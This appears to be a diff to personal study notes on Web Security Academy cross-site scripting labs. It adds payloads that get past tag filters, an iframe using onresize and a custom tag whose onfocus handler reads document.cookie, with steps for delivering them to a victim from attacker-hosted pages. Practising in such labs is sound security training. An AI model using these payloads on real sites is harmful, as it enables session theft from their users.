@@ -61,5 +61,21 @@ GET /?search=<§§> HTTP/2
 // need this to prevent problems with quotes, etc.
 <iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
 
+===
 
+// all tags except custom ones are blocked.
+// example payload for this scenario:
+<script>
+location = 'https://0ac800d20360cbfda1658ba600ba007b.web-security-academy.net/?search=<xss id=x onfocus=alert(document.cookie) tabindex=1>#x';
+</script>
+
+// in the above, a custom tag is used to create an element with an id=x
+// #x is appended to url that victim is redirected to in order to focus on element
+// and trigger code.
+// note: this is hosted on your attacker infra.
+// link to the hosted page is delivered to the victim.
+// url encode the payload, then deliver it:
+<script>
+location = 'https://0ac800d20360cbfda1658ba600ba007b.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
+</script>
 
